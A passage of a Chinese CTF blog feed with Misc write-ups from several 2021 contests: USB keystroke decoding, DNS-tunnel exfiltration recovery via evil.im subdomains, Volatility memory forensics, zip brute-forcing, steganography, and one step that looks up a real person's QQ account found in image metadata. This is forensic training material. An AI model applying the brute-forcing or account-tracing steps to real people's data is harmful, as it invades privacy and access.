    <content type="html"><![CDATA[<h1><span id="2021津门杯misc">2021津门杯Misc</span></h1><hr><h2><span id="m0usb">m0usb</span></h2><blockquote><p>运气好+师傅们都还没起床，有幸拿了一血</p></blockquote><p>usb流量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shark -r 12.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>提取出来的文件带空行，调整命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r 12.pcapng -T fields -e usb.capdata | sed &#39;&#x2F;^\s*$&#x2F;d&#39; &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>usb脚本结合</p><p>txt格式（无“：”）</p><p>更改脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">usb_codes &#x3D; &#123;</span><br><span class="line">    0x04: &quot;aA&quot;, 0x05: &quot;bB&quot;, 0x06: &quot;cC&quot;, 0x07: &quot;dD&quot;, 0x08: &quot;eE&quot;, 0x09: &quot;fF&quot;,</span><br><span class="line">    0x0A: &quot;gG&quot;, 0x0B: &quot;hH&quot;, 0x0C: &quot;iI&quot;, 0x0D: &quot;jJ&quot;, 0x0E: &quot;kK&quot;, 0x0F: &quot;lL&quot;,</span><br><span class="line">    0x10: &quot;mM&quot;, 0x11: &quot;nN&quot;, 0x12: &quot;oO&quot;, 0x13: &quot;pP&quot;, 0x14: &quot;qQ&quot;, 0x15: &quot;rR&quot;,</span><br><span class="line">    0x16: &quot;sS&quot;, 0x17: &quot;tT&quot;, 0x18: &quot;uU&quot;, 0x19: &quot;vV&quot;, 0x1A: &quot;wW&quot;, 0x1B: &quot;xX&quot;,</span><br><span class="line">    0x1C: &quot;yY&quot;, 0x1D: &quot;zZ&quot;, 0x1E: &quot;1!&quot;, 0x1F: &quot;2@&quot;, 0x20: &quot;3#&quot;, 0x21: &quot;4$&quot;,</span><br><span class="line">    0x22: &quot;5%&quot;, 0x23: &quot;6^&quot;, 0x24: &quot;7&amp;&quot;, 0x25: &quot;8*&quot;, 0x26: &quot;9(&quot;, 0x27: &quot;0)&quot;,</span><br><span class="line">    0x2C: &quot;  &quot;, 0x2D: &quot;-_&quot;, 0x2E: &quot;&#x3D;+&quot;, 0x2F: &quot;[&#123;&quot;, 0x30: &quot;]&#125;&quot;, 0x32: &quot;#~&quot;,</span><br><span class="line">    0x33: &quot;;:&quot;, 0x34: &quot;&#39;\&quot;&quot;, 0x36: &quot;,&lt;&quot;, 0x37: &quot;.&gt;&quot;, 0x38: &quot;&#x2F;?&quot;, 0x39: &quot;&lt;CAP&gt;&lt;CAP&gt;&quot;,</span><br><span class="line">    0x3a: &quot;&lt;F1&gt;&lt;F1&gt;&quot;, 0x3b: &quot;&lt;F4&gt;&lt;F4&gt;&quot;, 0x3e: &quot;&lt;F5&gt;&lt;F5&gt;&quot;, 0x3f: &quot;&lt;F6&gt;&lt;F6&gt;&quot;,</span><br><span class="line">    0x40: &quot;&lt;F7&gt;&lt;F7&gt;&quot;, 0x41: &quot;&lt;F8&gt;&lt;F8&gt;&quot;, 0x42: &quot;&lt;F9&gt;&lt;F9&gt;&quot;, 0x43: &quot;&lt;F10&gt;&lt;F10&gt;&quot;,</span><br><span class="line">    0x44: &quot;&lt;F11&gt;&lt;F11&gt;&quot;, 0x45: &quot;&lt;F12&gt;&lt;F12&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">for x in open(&quot;uuu.txt&quot;, &quot;r&quot;).readlines():</span><br><span class="line">    code &#x3D; int(x[4:6], 16) # 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]</span><br><span class="line">    # print(x[4:6])</span><br><span class="line">    if code &#x3D;&#x3D; 0:</span><br><span class="line">        continue</span><br><span class="line">    if code &#x3D;&#x3D; 0x28:</span><br><span class="line">        print(&#39;ENTER!&#39;)</span><br><span class="line">        print(data)</span><br><span class="line">        data &#x3D; &#39;&#39;</span><br><span class="line">        continue</span><br><span class="line">    upper &#x3D; 0</span><br><span class="line">    if int(x[0:2], 16) &#x3D;&#x3D; 0x02 or int(x[0:2], 16) &#x3D;&#x3D; 0x20:</span><br><span class="line">        upper &#x3D; 1</span><br><span class="line">    data +&#x3D; usb_codes[code][upper]</span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"># 884080810882108108821042084010421</span><br></pre></td></tr></table></figure><p>01248编码</p><p>上网找到脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding&#x3D;utf8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># @Author : pig</span><br><span class="line"># @CreatedTime:2019-11-2423:54:02</span><br><span class="line"># @Description : </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def de_code(c):</span><br><span class="line">    dic &#x3D; [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;Z&quot;) + 1)]</span><br><span class="line">    flag &#x3D; []</span><br><span class="line">    c2 &#x3D; [i for i in c.split(&quot;0&quot;)]</span><br><span class="line">    for i in c2:</span><br><span class="line">        c3 &#x3D; 0</span><br><span class="line">        for j in i:</span><br><span class="line">            c3 +&#x3D; int(j)</span><br><span class="line">        flag.append(dic[c3 - 1])</span><br><span class="line">    return flag</span><br><span class="line">def encode(plaintext):</span><br><span class="line">    dic &#x3D; [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;Z&quot;) + 1)]</span><br><span class="line">    m &#x3D; [i for i in plaintext]</span><br><span class="line">    tmp &#x3D; [];flag &#x3D; []</span><br><span class="line">    for i in range(len(m)):</span><br><span class="line">        for j in range(len(dic)):</span><br><span class="line">            if m[i] &#x3D;&#x3D; dic[j]:</span><br><span class="line">                tmp.append(j + 1)</span><br><span class="line">    for i in tmp:</span><br><span class="line">        res &#x3D; &quot;&quot;</span><br><span class="line">        if i &gt;&#x3D; 8:</span><br><span class="line">            res +&#x3D; int(i&#x2F;8)*&quot;8&quot;</span><br><span class="line">        if i%8 &gt;&#x3D;4:</span><br><span class="line">            res +&#x3D; int(i%8&#x2F;4)*&quot;4&quot;</span><br><span class="line">        if i%4 &gt;&#x3D;2:</span><br><span class="line">            res +&#x3D; int(i%4&#x2F;2)*&quot;2&quot;</span><br><span class="line">        if i%2 &gt;&#x3D; 1:</span><br><span class="line">            res +&#x3D; int(i%2&#x2F;1)*&quot;1&quot;</span><br><span class="line">        flag.append(res + &quot;0&quot;)</span><br><span class="line">    print (&quot;&quot;.join(flag)[:-1])</span><br><span class="line">c &#x3D; input(&quot;输入要解密的数字串:&quot;)</span><br><span class="line">print (de_code(c))</span><br><span class="line">m_code &#x3D; input(&quot;请输入要加密的数字串:&quot;)</span><br><span class="line">encode(m_code)</span><br><span class="line"></span><br><span class="line"># 输入要解密的数字串:884080810882108108821042084010421</span><br><span class="line"># [&#39;T&#39;, &#39;H&#39;, &#39;I&#39;, &#39;S&#39;, &#39;I&#39;, &#39;S&#39;, &#39;F&#39;, &#39;L&#39;, &#39;A&#39;, &#39;G&#39;]</span><br><span class="line"># flag&#123;THISISFLAG&#125;</span><br></pre></td></tr></table></figure><h2><span id="m1bmp">m1bmp</span></h2><p>lsb隐写</p><p>Stegsolve中提取最低位</p><p>后得到base</p><p>解码得到flag</p><hr><h2><span id="tunnel">tunnel</span></h2><p>参考博客</p><p><a class="link" href="https://blog.xpnsec.com/bsidessf-dnscap/">https://blog.xpnsec.com/bsidessf-dnscap/<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r tunnel.pcap -Tfields -e dns.qry.name &gt; names.txt</span><br></pre></td></tr></table></figure><p>观察得到的txt</p><p>出现诸多【<a class="link" href="http://evil.im">evil.im<i class="fas fa-external-link-alt"></i></a>】</p><p>观察第一行数据【<a class="link" href="http://UEsDBDMAAwBjAJ12k1KDFWibyjR.evil.im">UEsDBDMAAwBjAJ12k1KDFWibyjR.evil.im<i class="fas fa-external-link-alt"></i></a>】</p><p>尝试一把梭解码，发现base64：【PK3cvRhÊ4】</p><p>zip文件头</p><p>尝试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">name &#x3D; open(&#39;names.txt&#39;)</span><br><span class="line">a &#x3D; []</span><br><span class="line">b &#x3D; []</span><br><span class="line">for i in name:</span><br><span class="line">    # print(i)</span><br><span class="line">    if re.findall(&#39;.evil.im&#39;, i):</span><br><span class="line">        if i not in a:</span><br><span class="line">            a.append(i)</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>进行数据清洗，</p><p>base64解码后拼接，提示zip格式报错。</p><p>卡住</p><p>事后复现的时候才知道</p><p>此处应当对base64按行补齐，再进行拼接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(&quot;11.txt&quot;, &quot;r&quot;) as f:</span><br><span class="line">    x &#x3D; f.readlines()</span><br><span class="line"></span><br><span class="line">for i in x:</span><br><span class="line">    i &#x3D; i.strip()</span><br><span class="line">    # print(i)</span><br><span class="line">    l &#x3D; 4 - len(i) % 4</span><br><span class="line">    # print(l)</span><br><span class="line">    if l !&#x3D; 4:</span><br><span class="line">        i +&#x3D; &quot;&#x3D;&quot;* l</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><p>这样才能得到不报错的zip压缩包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def inttobin(a, n):</span><br><span class="line">    ret &#x3D; bin(a)[2:]</span><br><span class="line">    while len(ret) &lt; n:</span><br><span class="line">        ret &#x3D; &#39;0&#39; + ret</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">table &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;2.txt&quot;, &quot;r&quot;)</span><br><span class="line">tmpbin &#x3D; &#39;&#39;</span><br><span class="line">res &#x3D; &#39;&#39;</span><br><span class="line">line &#x3D; f.readline()</span><br><span class="line">while line:</span><br><span class="line">    if line[-2] &#x3D;&#x3D; &#39;&#x3D;&#39;:</span><br><span class="line">        if line[-3] &#x3D;&#x3D; &#39;&#x3D;&#39;:</span><br><span class="line">            tmpbin +&#x3D; inttobin(table.index(line[-4]), 6)[2:]</span><br><span class="line">        else:</span><br><span class="line">            tmpbin +&#x3D; inttobin(table.index(line[-3]), 6)[4:]</span><br><span class="line">    line &#x3D; f.readline()</span><br><span class="line">quotient &#x3D; int(len(tmpbin)&#x2F;8)</span><br><span class="line">for i in range(quotient):</span><br><span class="line">    res +&#x3D; chr(int(tmpbin[8*i:8*i+8], 2))</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line"># password: B@%MG&quot;6FjbS8^c#r                                                                     </span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="flag.jpg" alt="flag"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;2021津门杯misc&quot;&gt;2021津门杯Misc&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;m0usb&quot;&gt;m0usb&lt;/span&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;运气好+师傅们都还没起床，有幸拿了一血&lt;/p&gt;
&lt;/blo</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021年第六届全国网络空间安全技术大赛Misc</title>
    <link href="http://mklkx.github.io/2021/05/11/2021%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BMisc/"/>
    <id>http://mklkx.github.io/2021/05/11/2021%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BMisc/</id>
    <published>2021-05-11T06:15:21.000Z</published>
    <updated>2021-05-11T06:35:05.293Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021年第六届全国网络空间安全技术大赛misc">2021年第六届全国网络空间安全技术大赛Misc</span></h3><hr><h4><span id="rgb">RGB</span></h4><p>一共得到28864行RGB数据，</p><p>通过不断尝试分解64 x 11 x 41</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">x &#x3D; 176</span><br><span class="line">y &#x3D; 164</span><br><span class="line">img &#x3D; Image.new(&#39;RGB&#39;,(x,y))</span><br><span class="line">file &#x3D; open(&#39;R#G#B.txt&#39;, &#39;r&#39;)</span><br><span class="line">for width in range(0,x):</span><br><span class="line">    for height in range(0,y):</span><br><span class="line">        line &#x3D; file.readline()</span><br><span class="line">        print line</span><br><span class="line">        rgb &#x3D; line.split(&#39;#&#39;)</span><br><span class="line">        print rgb</span><br><span class="line">        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))</span><br><span class="line">img.save(&#39;rgb1.jpg&#39;)</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>水平翻转得到flag{c1d836d1db9d42dd}</p><h4><span id="zip">zip</span></h4><p>压缩包ARCHPR爆破得到密码【ff123】</p><p>得到【readme.txt】</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">培根密码</span><br><span class="line">BABBBBBAAAABAAB</span><br><span class="line"># XYJ</span><br><span class="line"># xyj</span><br></pre></td></tr></table></figure><p>【文章.docx】解密后</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>全选上色</p><p>得到flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}</p><h4><span id="memory_1">Memory_1</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看可能版本 </span><br><span class="line">volatility -f mal.vmem imageinfo </span><br><span class="line"># 查看进程 </span><br><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p>观察时间规律，发现曾经打开cmd</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>然而</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><p>只能看到ipconfig</p><p>发现文章https://wiki.wgpsec.org/knowledge/ctf/Volatility.html</p><p>尝试查看cmd的详细历史命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure><p>经过多次尝试，确定病毒名为</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>flag{24060da3d327991115a96e7099da25c3}</p><h4><span id="memory_2">Memory_2</span></h4><p>看一下用户信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p>在最后发现可疑net1.exe，</p><p>flag{45321c07f425d915c55424957353dd07}</p><h4><span id="slowloris">Slowloris</span></h4><p>1)小白做法为，</p><p>统计-》流量图-》遍历所有ip</p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p>md5加密</p><p>slowloris/195.8.178.227</p><p>得到flag</p><p>flag{3fc9d4a929cb690728d2b76c76483abe}</p><p>2)一般做法为：Slowloris攻击为大流量攻击，通过流量包查看哪两个ip之间有频繁交互即可锁定</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021年第六届全国网络空间安全技术大赛misc&quot;&gt;2021年第六届全国网络空间安全技术大赛Misc&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;rgb&quot;&gt;RGB&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;一共得到28864行RGB数据，&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021</title>
    <link href="http://mklkx.github.io/2021/05/04/ISCC2021/"/>
    <id>http://mklkx.github.io/2021/05/04/ISCC2021/</id>
    <published>2021-05-04T11:31:22.000Z</published>
    <updated>2021-06-06T13:03:21.513Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="iscc2021">ISCC2021</span></h1><hr><h2><span id="练武题">练武题</span></h2><h3><span id="retrieve-the-passcode">Retrieve the passcode</span></h3><blockquote><p>Scatter说他能解开这个古怪的密码，你呢？来试试吧！Flag格式：ISCC{XXX}，XXX为小写字符串，不包括空格</p></blockquote><p>得到【scatter.txt】【computer.rar】</p><p>观察txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1:3:1;1.25:3:1;1.5:3:1;1.75:3:1;2:3:1;2:2.75:1;2:2.5:1;2:2.25:1;2:2:1;</span><br></pre></td></tr></table></figure><p>结合搜索得知scatter为一种Python绘图函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2、scatter（X，Y，S）S确定每个标记的面积。 S可以是与X和Y相同长度的矢量或标量。如果S为空，则使用默认大小，如果S是标量，则MATLAB绘制所有标记的大小相同。如果S是矢量，则分别对应为X、Y所确定圆的大小；</span><br><span class="line">如scatter([11 12 13 14],[14 15 26 27],[20 25 100 38]);</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「阿卡蒂奥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;akadiao&#x2F;article&#x2F;details&#x2F;73656067</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">def scatter():</span><br><span class="line">    file &#x3D; open(&quot;scatter.txt&quot;, &quot;r&quot;)</span><br><span class="line">    text &#x3D; file.readlines()[0]</span><br><span class="line">    ch &#x3D; text.split(&quot;;&quot;)</span><br><span class="line">    x &#x3D; []</span><br><span class="line">    y &#x3D; []</span><br><span class="line">    for i in ch:</span><br><span class="line">        x.append(float(i.split(&#39;:&#39;)[0]))</span><br><span class="line">        y.append(float(i.split(&#39;:&#39;)[1]))</span><br><span class="line">    plt.scatter(x, y)</span><br><span class="line">    plt.show()</span><br><span class="line">scatter()</span><br></pre></td></tr></table></figure><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="scatter.png" alt="scatter"></p><p>压缩包密码【365728】</p><p>得到【computer.pdf】莫斯电码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. - .... . ..-. .-.. .- --. .. ...</span><br><span class="line">-.-. .... .- .-.. .-.. . -. --. . .. ... -.-. -.-. - .-- --- --.. . .-. --- - .-- --- --- -. .</span><br><span class="line">#CONGRATULATIONTHEFLAGIS</span><br><span class="line">#CHALLENGEISCCTWOZEROTWOONE</span><br></pre></td></tr></table></figure><p>然后就开始测格式，结果flag是两句话全输😂</p><h3><span id="海市蜃楼-1">海市蜃楼-1</span></h3><blockquote><p>或许你看到的只是海市蜃楼…</p></blockquote><p>word直接转zip</p><p>解压看内容</p><p>【ISCC\mirage-1\海市蜃楼-1\海市蜃楼-1\word\document.xml】</p><h3><span id="我的折扣是多少">我的折扣是多少</span></h3><blockquote><p>小c同学去参加音乐会，在官网买票时发现了有提示消息，提供给的有“give_me_discount”的压缩包，好奇的小c下载下来，但却无从下手，为了节省零花钱，你能帮帮他吗？</p></blockquote><p>得到【give.exe】【me.zip】【discount.mp3】</p><h4><span id="giveexe">【give.exe】</span></h4><p><img lazyload src="/images/loading.svg" data-src="give.png" alt="give"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pass1&#123;\u006b\u0072\u0077&#125;</span><br><span class="line"># unicode-》krw</span><br></pre></td></tr></table></figure><h4><span id="mezip">【me.zip】</span></h4><p>加密压缩包</p><p>010结尾看到base</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cGFzczJ7Z2NjNjY2fQ&#x3D;&#x3D;</span><br><span class="line"># pass2&#123;gcc666&#125;</span><br></pre></td></tr></table></figure><p>结合两个pass解压得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eW91Zm91bmRtZT8&#x3D;</span><br><span class="line"># youfoundme?</span><br></pre></td></tr></table></figure><h4><span id="discountmp3">【discount.mp3】</span></h4><p>mp3想到mp3stego</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">decode -X -P youfoundme? discount.mp3</span><br><span class="line"># ISCC&#123;LFXXK4TENFZWG33VNZ2DELRRGU&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#125;</span><br><span class="line"># ISCC&#123;Yourdiscount2.15&#125;</span><br></pre></td></tr></table></figure><h2><span id="擂台题">擂台题</span></h2><h3><span id="小明的表情包">小明的表情包</span></h3><blockquote><p>放假期间小红被亲戚叫去帮店里帮忙，店里忙极了导致小红没有时间写代码。小红苦恼极了，她突然想起来小明有一张非常适合描述她此时心情的表情包。于是，小红让小明把表情包分享给她。小明说如果你记得我的出生的日月年，我就交给你。小明的生日年份隐藏在这串凯撒密码“AVARGRRA AVARGL AVAR”中，你能帮小红得到小明的表情包吗？</p></blockquote><p>加密压缩包，根据提示为出生日月年，</p><p>凯撒密码为【NINETEEN NINETY NINE】</p><p>解密失败</p><p>尝试爆破，得到密码【07071999】</p><p>jpg格式有误，补全jpg文件头【FFD9FFE0】</p><p>得到flag</p><h3><span id="真作假时假亦真">真作假时假亦真</span></h3><blockquote><p>浅韵姐姐第一次参加ISCC，但没有很多CTF工具，为此她很苦恼。你能切身体会一下吗？附件下载链接：<a class="link" href="https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw">https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw<i class="fas fa-external-link-alt"></i></a>提取码：a0oh</p></blockquote><p>得到download.wav</p><p>末尾的莫斯电码【ISCC:HEYHONEY,AREYOULOOKINGFORTHEFUCKINGFLAGNOW?】</p><p>丢进010editor发现png文件头，手动分离</p><p>得到一张二维码付款码</p><p>kali里exiftool得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@TyrantK:~&#x2F;桌面# exiftool Untitled1.png </span><br><span class="line">ExifTool Version Number         : 11.92</span><br><span class="line">File Name                       : Untitled1.png</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 288 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2021:05:04 15:44:32+08:00</span><br><span class="line">File Access Date&#x2F;Time           : 2021:05:04 16:06:45+08:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2021:05:04 16:06:44+08:00</span><br><span class="line">File Permissions                : rw-------</span><br><span class="line">File Type                       : PNG</span><br><span class="line">File Type Extension             : png</span><br><span class="line">MIME Type                       : image&#x2F;png</span><br><span class="line">Image Width                     : 1242</span><br><span class="line">Image Height                    : 1704</span><br><span class="line">Bit Depth                       : 8</span><br><span class="line">Color Type                      : RGB with Alpha</span><br><span class="line">Compression                     : Deflate&#x2F;Inflate</span><br><span class="line">Filter                          : Adaptive</span><br><span class="line">Interlace                       : Noninterlaced</span><br><span class="line">Pixels Per Unit X               : 2874</span><br><span class="line">Pixels Per Unit Y               : 2874</span><br><span class="line">Pixel Units                     : meters</span><br><span class="line">XMP Toolkit                     : Adobe XMP Core 6.0-c002 79.164488, 2020&#x2F;07&#x2F;10-22:06:53</span><br><span class="line">Creator Tool                    : Adobe Photoshop 22.0 (Windows)</span><br><span class="line">Create Date                     : 2021:05:03 00:55:27+08:00</span><br><span class="line">Modify Date                     : 2021:05:03 00:59:09+08:00</span><br><span class="line">Metadata Date                   : 2021:05:03 00:59:09+08:00</span><br><span class="line">Format                          : image&#x2F;png</span><br><span class="line">Color Mode                      : RGB</span><br><span class="line">ICC Profile Name                : sRGB IEC61966-2.1</span><br><span class="line">Instance ID                     : xmp.iid:08dbb1cf-06a6-6147-a19e-3c30c111887d</span><br><span class="line">Document ID                     : adobe:docid:photoshop:0cf82e22-bc60-394b-9808-1ec5719e29bc</span><br><span class="line">Original Document ID            : xmp.did:94a58657-d199-9a45-bb13-6a6d55604521</span><br><span class="line">Text Layer Name                 : ポ④ωаиɡ锗榮燿棑位笩╇Ｑ㈠⒌2肆⒌⒌23㈦2ず</span><br><span class="line">Text Layer Text                 : ポ④ωаиɡ锗榮燿棑位笩╇Ｑ㈠⒌2肆⒌⒌23㈦2ず</span><br><span class="line">History Action                  : created, saved</span><br><span class="line">History Instance ID             : xmp.iid:94a58657-d199-9a45-bb13-6a6d55604521, xmp.iid:08dbb1cf-06a6-6147-a19e-3c30c111887d</span><br><span class="line">History When                    : 2021:05:03 00:55:27+08:00, 2021:05:03 00:59:09+08:00</span><br><span class="line">History Software Agent          : Adobe Photoshop 22.0 (Windows), Adobe Photoshop 22.0 (Windows)</span><br><span class="line">History Changed                 : &#x2F;</span><br><span class="line">Image Size                      : 1242x1704</span><br><span class="line">Megapixels                      : 2.1</span><br></pre></td></tr></table></figure><p>一开始以为是存在乱码，010editor，exiftool，以及图片增高都得到了字符串【ポ④ωаиɡ锗榮燿棑位笩╇Ｑ㈠⒌2肆⒌⒌23㈦2ず】</p><p>确认有东西，开始辨认【xx王者荣耀xx+Q1524552372】</p><p>开始社工</p><p><img lazyload src="/images/loading.svg" data-src="zhenjia.png" alt="zhenjia"></p><p>这是最离谱的，居然不是flag</p><p>于是进入空间，在相册里发现了</p><p><img lazyload src="/images/loading.svg" data-src="psc.jpg" alt="psc"></p><p>同样是010模板查看</p><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wwa.lanzous.com&#x2F;iNVbsoqrz8f</span><br><span class="line">MTVDQw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>下载得到txt</p><p><img lazyload src="/images/loading.svg" data-src="test.png" alt="test"></p><p>社会主义核心价值观加密/解密</p><p><a class="link" href="http://www.atoolbox.net/Tool.php?Id=850">http://www.atoolbox.net/Tool.php?Id=850<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="shzyhxjzg.png" alt="shzyhxjzg"></p><p>卡住</p><p>因为txt里【你会算这笔帐吗？】</p><p>尝试相加，失败</p><p>尝试词频，失败</p><p>最后【中文数字为黑，阿拉伯数字为白，25*25】转二维码</p><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="erweima.png" alt="erweima"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;iscc2021&quot;&gt;ISCC2021&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;练武题&quot;&gt;练武题&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&quot;retrieve-the-passcode&quot;&gt;Retrieve the passc</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021第五届蓝帽杯初赛</title>
    <link href="http://mklkx.github.io/2021/05/04/2021%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <id>http://mklkx.github.io/2021/05/04/2021%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/</id>
    <published>2021-05-04T02:29:08.000Z</published>
    <updated>2021-05-04T11:39:55.631Z</updated>
    
